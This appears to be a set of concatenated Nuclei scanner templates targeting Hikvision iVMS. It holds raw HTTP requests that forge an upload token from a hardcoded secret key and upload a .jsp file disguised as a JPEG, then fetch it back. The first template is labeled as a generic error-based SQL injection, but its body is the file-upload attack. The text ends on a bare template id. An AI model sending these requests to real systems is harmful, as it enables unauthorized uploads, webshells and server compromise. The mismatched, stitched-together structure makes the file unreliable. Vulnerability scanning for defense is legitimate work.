id: error-based-sql-injection
info:
  author: geeknik
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
  description: A SQL injection vulnerability was identified based on an error message
    returned by the server.
  metadata:
    max-request: 1
  name: Error based SQL injection
  severity: critical
  tags: sqli,generic,error,vuln
---
http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"success":true'
    - '"resourceName":'
  raw:
  - 'POST /eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}}
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo


    ------WebKitFormBoundaryGEJwiloiPo

    Content-Disposition: form-data; name="fileUploader";filename="{{randstr}}.jsp"

    Content-Type: image/jpeg


    {{randstr}}

    ------WebKitFormBoundaryGEJwiloiPo%20

    '
id: hikvision-ivms-file-upload-bypass
info:
  author: SleepingBag945
  description: Hikvision iVMS integrated security system has a vulnerability that
    allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining
    the encryption key to create a forged token. By using the forged token, they can
    make requests to the "/resourceOperations/upload" interface to upload files of
    their choice. This can lead to gaining unauthorized webshell access on the server,
    enabling remote execution of malicious code.
  metadata:
    fofa-query: icon_hash="-911494769"
    max-request: 1
    verified: true
  name: Hikvison iVMS - File Upload Bypass
  reference:
  - https://blog.csdn.net/qq_41904294/article/details/130807691
  severity: critical
  tags: hikvision,ivms,intrusive,fileupload,auth-bypass,vuln
---
http:
- extractors:
  - internal: true
    json:
    - .data.resourceUuid
    name: res_id
    type: json
  matchers:
  - dsl:
    - body_2 == str2
    type: dsl
  raw:
  - 'POST /eps/resourceOperations/upload.action HTTP/1.1

    Host: {{Hostname}}

    User-Agent: MicroMessenger

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj


    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj

    Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"

    Content-Type: image/jpeg


    {{str3}}

    ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--

    '
  - 'GET /eps/upload/{{res_id}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
id: hikvision-ivms-file-upload-rce
